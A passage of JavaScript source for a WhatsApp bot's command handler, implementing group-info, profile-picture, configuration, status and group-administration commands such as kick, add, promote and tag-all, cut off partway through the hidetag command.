            const total = meta.participants?.length || 0;
            const created = meta.creation ? new Date(meta.creation * 1000).toLocaleDateString() : 'unknown';
            const status = meta.announce ? '🔒 Admin-only' : '🔓 Open';
            const community = meta.isCommunity ? '✅ Yes' : '❌ No';
            await sock.sendMessage(jid, { text: buildOmegaTerminal(
              `   ┌── *KINGDOM INTEL* ──┐\n` +
              `   ╿\n` +
              `   ┝  *NAME*      : ${meta.subject || 'Unknown'}\n` +
              `   ┝  *MEMBERS*   : ${total}\n` +
              `   ┝  *ADMINS*    : ${admins}\n` +
              `   ┝  *CREATED*   : ${created}\n` +
              `   ┝  *STATUS*    : ${status}\n` +
              `   ┝  *COMMUNITY* : ${community}\n` +
              (meta.desc ? `   ┝  *DESC*      : ${meta.desc.slice(0, 100)}${meta.desc.length > 100 ? '...' : ''}\n` : '') +
              `   ╿\n` +
              `   └── *INTEL COMPLETE* ──┘`
            ) }, quotedOpts(msg));
          } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        } else {
          // DM chat info
          const targetNum = jid.split('@')[0].split(':')[0];
          let profileName = 'Unknown';
          try {
            const [result] = await sock.onWhatsApp(targetNum + '@s.whatsapp.net');
            if (result?.exists) profileName = 'Registered on WhatsApp';
          } catch (_) {}
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ┌── *VESSEL INTEL* ──┐\n` +
            `   ╿\n` +
            `   ┝  *NUMBER*  : ${targetNum}\n` +
            `   ┝  *TYPE*    : Direct Message\n` +
            `   ┝  *STATUS*  : ${profileName}\n` +
            `   ╿\n` +
            `   └── *INTEL COMPLETE* ──┘`
          ) }, quotedOpts(msg));
        }
        return;
      }

      // ── .getpp <@tag/number> or reply ──
      if (lower === '.getpp' || lower.startsWith('.getpp ')) {
        let targetJid = '';
        const ctx = msg.message?.extendedTextMessage?.contextInfo;
        if (ctx?.participant) targetJid = ctx.participant;
        if (!targetJid && ctx?.mentionedJid?.length > 0) targetJid = ctx.mentionedJid[0];
        if (!targetJid) {
          const num = normalizeNum(text.split(/\s+/)[1] || '');
          if (num && num.length >= 10) targetJid = `${num}@s.whatsapp.net`;
        }
        if (!targetJid) { await sock.sendMessage(jid, { text: 'Usage: .getpp <@tag or number>\nOr reply to someone\'s msg with .getpp' }, quotedOpts(msg)); return; }
        try {
          const ppUrl = await sock.profilePictureUrl(targetJid, 'image');
          if (ppUrl) {
            const https = require('https');
            const imgBuf = await new Promise((resolve, reject) => {
              https.get(ppUrl, (res) => { const c = []; res.on('data', d => c.push(d)); res.on('end', () => resolve(Buffer.concat(c))); }).on('error', reject);
            });
            await sock.sendMessage(jid, { image: imgBuf, caption: `🖼️ *Profile picture of* ${targetJid.split('@')[0]}` }, quotedOpts(msg));
          } else {
            await sock.sendMessage(jid, { text: '⚠️ No profile picture found.' }, quotedOpts(msg));
          }
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Could not extract: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .getgpp or .getgpp <link> ──
      if (lower === '.getgpp' || lower.startsWith('.getgpp ')) {
        let groupJid = '';
        if (String(jid).endsWith('@g.us') && lower === '.getgpp') {
          groupJid = jid;
        } else {
          const link = text.split(/\s+/)[1] || '';
          const code = link.replace(/https?:\/\/chat\.whatsapp\.com\//i, '').trim();
          if (code) {
            try { const info = await sock.groupGetInviteInfo(code); groupJid = info?.id || ''; }
            catch (e) { await sock.sendMessage(jid, { text: `❌ Invalid link: ${e.message}` }, quotedOpts(msg)); return; }
          }
        }
        if (!groupJid) { await sock.sendMessage(jid, { text: 'Usage: .getgpp (in a group)\nOr: .getgpp <group invite link>' }, quotedOpts(msg)); return; }
        try {
          const ppUrl = await sock.profilePictureUrl(groupJid, 'image');
          if (ppUrl) {
            const https = require('https');
            const imgBuf = await new Promise((resolve, reject) => {
              https.get(ppUrl, (res) => { const c = []; res.on('data', d => c.push(d)); res.on('end', () => resolve(Buffer.concat(c))); }).on('error', reject);
            });
            const sendTo = String(jid).endsWith('@g.us') ? (sock.user?.id || jid) : jid;
            await sock.sendMessage(sendTo, { image: imgBuf, caption: `🖼️ *Group profile picture*` });
            if (sendTo !== jid) await sock.sendMessage(jid, { text: '✅ Group pic sent to your DM.' }, quotedOpts(msg));
          } else {
            await sock.sendMessage(jid, { text: '⚠️ No group picture found.' }, quotedOpts(msg));
          }
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ═══════════════════════════════════════════════════════
      // ══ CONFIG MENU COMMANDS ═══════════════════════════════
      // ═══════════════════════════════════════════════════════

      // ── .setname <name> ──
      if (lower.startsWith('.setname ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const name = text.slice('.setname '.length).trim();
        if (!name) { await sock.sendMessage(jid, { text: 'Usage: .setname <new name>' }, quotedOpts(msg)); return; }
        try {
          await sock.updateProfileName(name);
          await sock.sendMessage(jid, { text: `✅ Display name updated to: *${name}*` }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .setbio <text> ──
      if (lower.startsWith('.setbio ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const bio = text.slice('.setbio '.length).trim();
        if (!bio) { await sock.sendMessage(jid, { text: 'Usage: .setbio <bio text>' }, quotedOpts(msg)); return; }
        try {
          await sock.updateProfileStatus(bio);
          await sock.sendMessage(jid, { text: `✅ Status updated to:\n_${bio}_` }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .setpp (reply to image) ──
      if (lower === '.setpp') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const quotedImgMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage || msg.message?.imageMessage;
        if (!quotedImgMsg) { await sock.sendMessage(jid, { text: '🖼️ *Set Profile Picture*\n\nReply to an image with *.setpp* to set it as the bot\'s profile pic.' }, quotedOpts(msg)); return; }
        try {
          const stream = await downloadContentFromMessage(quotedImgMsg, 'image');
          let buffer = Buffer.from([]);
          for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
          await sock.updateProfilePicture(sock.user.id, buffer);
          await sock.sendMessage(jid, { text: '✅ Profile picture updated.' }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .setmenupic (reply to image) ──
      if (lower === '.setmenupic') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const quotedImgMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage || msg.message?.imageMessage;
        if (!quotedImgMsg) { await sock.sendMessage(jid, { text: '🖼️ Reply to an image with *.setmenupic* to set it as the menu banner.\n\nThis image appears in Stage 3 of the .menu animation.' }, quotedOpts(msg)); return; }
        try {
          const stream = await downloadContentFromMessage(quotedImgMsg, 'image');
          let buffer = Buffer.from([]); for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
          fs.writeFileSync('menu_banner.jpg', buffer);
          await sock.sendMessage(jid, { text: '✅ Menu banner image set! Type .menu to see it.' }, quotedOpts(msg));
          // Force backup so the banner survives redeploy
          await backupAuthToChannel(true);
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .delmenupic ──
      if (lower === '.delmenupic') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        try { if (fs.existsSync('menu_banner.jpg')) fs.unlinkSync('menu_banner.jpg'); } catch (_) {}
        await sock.sendMessage(jid, { text: '✅ Menu banner removed. Menu will use text-only mode.' }, quotedOpts(msg));
        return;
      }

      // ── .setalias <original> <alias> ──
      if (lower.startsWith('.setalias ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const parts = text.trim().split(/\s+/);
        const original = parts[1]?.toLowerCase();
        const alias = parts[2]?.toLowerCase();
        if (!original || !alias) { await sock.sendMessage(jid, { text: 'Usage: .setalias <original cmd> <new name>\n\nExample: .setalias menu m\nThen .m will trigger .menu' }, quotedOpts(msg)); return; }
        setAlias(ownerNum, original, alias);
        await sock.sendMessage(jid, { text: `✅ Alias set: *.${alias}* → *.${original}*\n\n_This alias is for your session only._` }, quotedOpts(msg));
        return;
      }

      // ── .delalias <alias> ──
      if (lower.startsWith('.delalias ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const alias = text.split(/\s+/)[1]?.toLowerCase();
        if (!alias) { await sock.sendMessage(jid, { text: 'Usage: .delalias <alias name>' }, quotedOpts(msg)); return; }
        delAlias(ownerNum, alias);
        await sock.sendMessage(jid, { text: `✅ Alias *.${alias}* removed.` }, quotedOpts(msg));
        return;
      }

      // ── .aliaslist ──
      if (lower === '.aliaslist') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const aliases = getAliases(ownerNum);
        const entries = Object.entries(aliases);
        if (entries.length === 0) {
          await sock.sendMessage(jid, { text: '📭 No aliases set.\n\nUse *.setalias <cmd> <new>* to create one.' }, quotedOpts(msg));
        } else {
          const list = entries.map(([alias, orig], i) => `${i + 1}. *.${alias}* → *.${orig}*`).join('\n');
          await sock.sendMessage(jid, { text: `📋 *Your Aliases* (${entries.length})\n━━━━━━━━━━━━━━\n${list}\n\n_These are for your session only._` }, quotedOpts(msg));
        }
        return;
      }

      // ── .prefix <char> ──
      if (lower === '.prefix' || lower.startsWith('.prefix ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const newPrefix = text.split(/\s+/)[1]?.trim();
        if (!newPrefix) {
          const cur = getPrefix(ownerNum);
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ┌── *COMMAND PREFIX* ──┐\n` +
            `   ╿\n` +
            `   ┝  *CURRENT* : ${cur}\n` +
            `   ╿\n` +
            `   └── *Usage: .prefix <char>* ──┘\n\n` +
            `   Examples: .prefix !  .prefix /  .prefix #`
          ) }, quotedOpts(msg));
          return;
        }
        if (newPrefix.length > 2) { await sock.sendMessage(jid, { text: '⚠️ Prefix must be 1-2 characters.' }, quotedOpts(msg)); return; }
        setPrefix(ownerNum, newPrefix);
        await sock.sendMessage(jid, { text: `✅ Prefix changed to: *${newPrefix}*\n\nAll commands now use *${newPrefix}* instead of *.*\nExample: *${newPrefix}menu* *${newPrefix}ping*\n\n_To reset: ${newPrefix}prefix ._` }, quotedOpts(msg));
        return;
      }

      // ── .autoreact ──
      if (lower === '.autoreact' || lower.startsWith('.autoreact ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const parts = text.trim().split(/\s+/);
        const action = parts[1]?.toLowerCase();
        const ar = getAutoreact(ownerNum);

        if (!action) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ┌── *AUTOREACT STATUS* ──┐\n` +
            `   ╿\n` +
            `   ┝  *ENABLED* : ${ar.enabled ? '✅ YES' : '❌ NO'}\n` +
            `   ┝  *EMOJI*   : ${ar.emoji}\n` +
            `   ┝  *SCOPE*   : ${ar.scope}\n` +
            `   ┝  *TARGETS* : ${ar.targets?.length || 0}\n` +
            `   ╿\n` +
            `   └── *USAGE* ──┘\n\n` +
            `   .autoreact on <emoji>\n` +
            `     └─ react globally to all groups\n` +
            `   .autoreact off\n` +
            `     └─ disable autoreact\n` +
            `   .autoreact add <group/channel link>\n` +
            `     └─ react only in specific target\n` +
            `   .autoreact clear\n` +
            `     └─ remove all targets (back to global)`
          ) }, quotedOpts(msg));
          return;
        }

        if (action === 'off') {
          ar.enabled = false;
          setAutoreact(ownerNum, ar);
          await sock.sendMessage(jid, { text: '✅ Autoreact disabled.' }, quotedOpts(msg));
          return;
        }

        if (action === 'on') {
          const emoji = parts[2] || '⚡';
          ar.enabled = true;
          ar.emoji = emoji;
          if (ar.targets.length === 0) ar.scope = 'global';
          setAutoreact(ownerNum, ar);
          await sock.sendMessage(jid, { text: `✅ Autoreact enabled: ${emoji}\nScope: ${ar.scope === 'global' ? 'All groups' : `${ar.targets.length} target(s)`}` }, quotedOpts(msg));
          return;
        }

        if (action === 'add') {
          const link = parts[2] || '';
          const code = link.replace(/https?:\/\/chat\.whatsapp\.com\//i, '').replace(/https?:\/\/whatsapp\.com\/channel\//i, '').trim();
          if (!code && String(jid).endsWith('@g.us')) {
            // Use current group
            ar.targets.push(jid);
            ar.scope = 'targets';
            ar.enabled = true;
            setAutoreact(ownerNum, ar);
            await sock.sendMessage(jid, { text: '✅ This group added to autoreact targets.' }, quotedOpts(msg));
            return;
          }
          if (!code) { await sock.sendMessage(jid, { text: 'Usage: .autoreact add <group link>\nOr use inside a group: .autoreact add' }, quotedOpts(msg)); return; }
          try {
            const info = await sock.groupGetInviteInfo(code);
            if (info?.id) {
              ar.targets.push(info.id);
              ar.scope = 'targets';
              ar.enabled = true;
              setAutoreact(ownerNum, ar);
              await sock.sendMessage(jid, { text: `✅ Added *${info.subject || 'group'}* to autoreact targets.\nTotal targets: ${ar.targets.length}` }, quotedOpts(msg));
            }
          } catch (e) {
            // Maybe it's a channel or direct JID
            ar.targets.push(code);
            ar.scope = 'targets';
            ar.enabled = true;
            setAutoreact(ownerNum, ar);
            await sock.sendMessage(jid, { text: `✅ Added target: ${code}\nTotal targets: ${ar.targets.length}` }, quotedOpts(msg));
          }
          return;
        }

        if (action === 'clear') {
          ar.targets = [];
          ar.scope = 'global';
          setAutoreact(ownerNum, ar);
          await sock.sendMessage(jid, { text: '✅ All autoreact targets cleared. Scope reset to global.' }, quotedOpts(msg));
          return;
        }

        // Unknown action — treat as emoji shortcut: .autoreact 🔥
        ar.enabled = true;
        ar.emoji = action;
        setAutoreact(ownerNum, ar);
        await sock.sendMessage(jid, { text: `✅ Autoreact emoji set to: ${action}` }, quotedOpts(msg));
        return;
      }

      // ═══════════════════════════════════════════════════════
      // ══ SYSTEM MENU COMMANDS ═══════════════════════════════
      // ═══════════════════════════════════════════════════════

      // ── .owner ──
      if (lower === '.owner') {
        const devName = process.env.DEV_NAME || 'Phantom dev x';
        const devNumber = process.env.DEV_NUMBER || '2348102756072';
        const botNum = sock.user?.id ? sock.user.id.split(':')[0].split('@')[0] : 'unknown';
        await sock.sendMessage(jid, { text: buildOmegaTerminal(
          `   ┌── *THE ARCHITECT* ──┐\n` +
          `   ╿\n` +
          `   ┝  *NAME*    : ${devName}\n` +
          `   ┝  *SIGNAL*  : wa.me/${devNumber}\n` +
          `   ┝  *BOT*     : wa.me/${botNum}\n` +
          `   ╿\n` +
          `   └── *THE VOID WAS FORGED* ──┘\n\n` +
          `   " *Creation is the first step*\n     *toward destruction.* "`
        ) }, quotedOpts(msg));
        return;
      }

      // ── .uptime ──
      if (lower === '.uptime') {
        const mu = process.memoryUsage();
        const heapU = (mu.heapUsed / 1024 / 1024).toFixed(0);
        const heapT = (mu.heapTotal / 1024 / 1024).toFixed(0);
        const rss = (mu.rss / 1024 / 1024).toFixed(0);
        const up = formatUptime(Date.now() - botStartTime);
        await sock.sendMessage(jid, { text: buildOmegaTerminal(
          `   ┌── *TEMPORAL LOGS* ──┐\n` +
          `   ╿\n` +
          `   ┝  *ACTIVE* : ${up}\n` +
          `   ┝  *HEAP*   : ${heapU}MB / ${heapT}MB\n` +
          `   ┝  *RSS*    : ${rss}MB\n` +
          `   ┝  *PID*    : ${process.pid}\n` +
          `   ╿\n` +
          `   └── *STABILITY: OPERATIONAL* ──┘\n\n` +
          `   " *I have survived the collapse.*\n     *My pulse keeps this realm*\n     *from drifting into the void.* "`
        ) }, quotedOpts(msg));
        return;
      }

      // ── .status (system health) ──
      if (lower === '.status') {
        const now = Date.now();
        const uptime = formatUptime(now - botStartTime);
        const mu = process.memoryUsage();
        const memMB = (mu.heapUsed / 1024 / 1024).toFixed(1);
        const totalMemMB = (mu.heapTotal / 1024 / 1024).toFixed(1);
        const botNum = sock.user?.id ? sock.user.id.split(':')[0].split('@')[0] : 'unknown';
        const mode = getSessionMode(ownerNum);
        const platform = sock.authState?.creds?.platform || 'unknown';
        await sock.sendMessage(jid, { text: buildOmegaTerminal(
          `   ┌── *SYSTEM HEALTH* ──┐\n` +
          `   ╿\n` +
          `   ┝  *STATUS*   : ${isConnected ? '🟢 CONNECTED' : '🔴 DISCONNECTED'}\n` +
          `   ┝  *UPTIME*   : ${uptime}\n` +
          `   ┝  *MEMORY*   : ${memMB}MB / ${totalMemMB}MB\n` +
          `   ┝  *PLATFORM* : ${platform}\n` +
          `   ┝  *MODE*     : ${mode.toUpperCase()}\n` +
          `   ┝  *BOT*      : ${botNum}\n` +
          `   ┝  *SESSIONS* : ${successfulPairings}\n` +
          `   ┝  *SOCKET*   : Gen ${socketGeneration}\n` +
          `   ╿\n` +
          `   └── *VOID INTEGRITY: STABLE* ──┘`
        ) }, quotedOpts(msg));
        return;
      }

      // ── .restart ──
      if (lower === '.restart') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const restartKey = socketKeyMap.get(sock) || null;
        await sock.sendMessage(jid, { text: '♻️ Restarting *this* session...' }, quotedOpts(msg));
        setTimeout(() => {
          try { sock.end(new Error('Manual restart requested')); } catch (_) {}
          if (restartKey) {
            // Multi-session: preserve auth, reconnect same number
            delete activeSockets[restartKey];
            setTimeout(() => startBot(null, null, 'reconnect', { authDir: 'auth_info_' + restartKey, socketKey: restartKey }).catch(console.error), 2000);
          } else {
            // Main session
            currentSock = null;
            setTimeout(() => startBot(null, null, 'reconnect').catch(console.error), 2000);
          }
        }, 1000);
        return;
      }


      // ═══════════════════════════════════════════════════════
      // ══ GROUP MENU COMMANDS ════════════════════════════════
      // ═══════════════════════════════════════════════════════

      // ── .kick @user ──
      if (lower === '.kick' || lower.startsWith('.kick ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin to kick.' }, quotedOpts(msg)); return; }
        const target = resolveTargetJid(msg, text.split(/\s+/));
        if (!target) { await sock.sendMessage(jid, { text: 'Usage: .kick @user or reply to their msg' }, quotedOpts(msg)); return; }
        try {
          await sock.groupParticipantsUpdate(jid, [target], 'remove');
          await sock.sendMessage(jid, { text: `✅ @${target.split('@')[0]} has been removed.`, mentions: [target] }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .add <number> ──
      if (lower.startsWith('.add ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin to add.' }, quotedOpts(msg)); return; }
        const num = normalizeNum(text.split(/\s+/)[1] || '');
        if (!num || num.length < 10) { await sock.sendMessage(jid, { text: 'Usage: .add <number with country code>' }, quotedOpts(msg)); return; }
        try {
          const result = await sock.groupParticipantsUpdate(jid, [`${num}@s.whatsapp.net`], 'add');
          const status = result?.[0]?.status || 'unknown';
          if (status === '200' || status === 200) {
            await sock.sendMessage(jid, { text: `✅ ${num} added.` }, quotedOpts(msg));
          } else if (status === '403' || status === 403) {
            await sock.sendMessage(jid, { text: `⚠️ ${num} has privacy settings that prevent adding. An invite was sent.` }, quotedOpts(msg));
          } else {
            await sock.sendMessage(jid, { text: `⚠️ Status: ${status}` }, quotedOpts(msg));
          }
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .promote @user ──
      if (lower === '.promote' || lower.startsWith('.promote ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin.' }, quotedOpts(msg)); return; }
        const target = resolveTargetJid(msg, text.split(/\s+/));
        if (!target) { await sock.sendMessage(jid, { text: 'Usage: .promote @user' }, quotedOpts(msg)); return; }
        try {
          await sock.groupParticipantsUpdate(jid, [target], 'promote');
          await sock.sendMessage(jid, { text: `✅ @${target.split('@')[0]} promoted to admin.`, mentions: [target] }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .demote @user ──
      if (lower === '.demote' || lower.startsWith('.demote ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin.' }, quotedOpts(msg)); return; }
        const target = resolveTargetJid(msg, text.split(/\s+/));
        if (!target) { await sock.sendMessage(jid, { text: 'Usage: .demote @user' }, quotedOpts(msg)); return; }
        try {
          await sock.groupParticipantsUpdate(jid, [target], 'demote');
          await sock.sendMessage(jid, { text: `✅ @${target.split('@')[0]} demoted.`, mentions: [target] }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .setgname <name> ──
      if (lower.startsWith('.setgname ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        const name = text.slice('.setgname '.length).trim();
        if (!name) { await sock.sendMessage(jid, { text: 'Usage: .setgname <new name>' }, quotedOpts(msg)); return; }
        try { await sock.groupUpdateSubject(jid, name); await sock.sendMessage(jid, { text: `✅ Group name changed to: *${name}*` }, quotedOpts(msg)); }
        catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .setgdesc <text> ──
      if (lower.startsWith('.setgdesc ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        const desc = text.slice('.setgdesc '.length).trim();
        try { await sock.groupUpdateDescription(jid, desc); await sock.sendMessage(jid, { text: '✅ Group description updated.' }, quotedOpts(msg)); }
        catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .setgpp (reply to image) ──
      if (lower === '.setgpp') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin.' }, quotedOpts(msg)); return; }
        const quotedImgMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage || msg.message?.imageMessage;
        if (!quotedImgMsg) { await sock.sendMessage(jid, { text: 'Reply to an image with .setgpp' }, quotedOpts(msg)); return; }
        try {
          const stream = await downloadContentFromMessage(quotedImgMsg, 'image');
          let buffer = Buffer.from([]); for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
          await sock.updateProfilePicture(jid, buffer);
          await sock.sendMessage(jid, { text: '✅ Group picture updated.' }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .lock / .unlock ──
      if (lower === '.lock') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin.' }, quotedOpts(msg)); return; }
        try { await sock.groupSettingUpdate(jid, 'announcement'); await sock.sendMessage(jid, { text: '🔒 Group locked — only admins can send.' }, quotedOpts(msg)); }
        catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }
      if (lower === '.unlock') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin.' }, quotedOpts(msg)); return; }
        try { await sock.groupSettingUpdate(jid, 'not_announcement'); await sock.sendMessage(jid, { text: '🔓 Group unlocked — everyone can send.' }, quotedOpts(msg)); }
        catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .link ──
      if (lower === '.link') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin.' }, quotedOpts(msg)); return; }
        try { const code = await sock.groupInviteCode(jid); await sock.sendMessage(jid, { text: `🔗 https://chat.whatsapp.com/${code}` }, quotedOpts(msg)); }
        catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .revoke ──
      if (lower === '.revoke') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        if (!(await isBotAdmin(sock, jid))) { await sock.sendMessage(jid, { text: '⚠️ Bot must be admin.' }, quotedOpts(msg)); return; }
        try { await sock.groupRevokeInvite(jid); await sock.sendMessage(jid, { text: '✅ Group invite link revoked. Use .link for new one.' }, quotedOpts(msg)); }
        catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .tagall / .everyone / .all ──
      if (lower === '.tagall' || lower === '.everyone' || lower === '.all' || lower.startsWith('.tagall ') || lower.startsWith('.everyone ') || lower.startsWith('.all ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        try {
          const meta = await sock.groupMetadata(jid);
          const participants = meta.participants?.map(p => p.id) || [];
          const customMsg = text.replace(/^\.(tagall|everyone|all)\s*/i, '').trim();
          const tagText = customMsg || '📢 *Attention everyone!*';
          const mentions = participants.map(p => `@${p.split('@')[0]}`).join(' ');
          await sock.sendMessage(jid, { text: `${tagText}\n\n${mentions}`, mentions: participants }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .hidetag / .ht — secretly tag all members ──
      if (lower === '.ht' || lower === '.hidetag' || lower.startsWith('.ht ') || lower.startsWith('.hidetag ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        
        // Get the message to send — from args, or from quoted/replied message
        let hiddenMsg = '';
        if (lower.startsWith('.hidetag ')) hiddenMsg = text.slice('.hidetag '.length).trim();
        else if (lower.startsWith('.ht ')) hiddenMsg = text.slice('.ht '.length).trim();
        
        // If no args, check if replying to a message
        if (!hiddenMsg) {
          const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          if (quoted) {
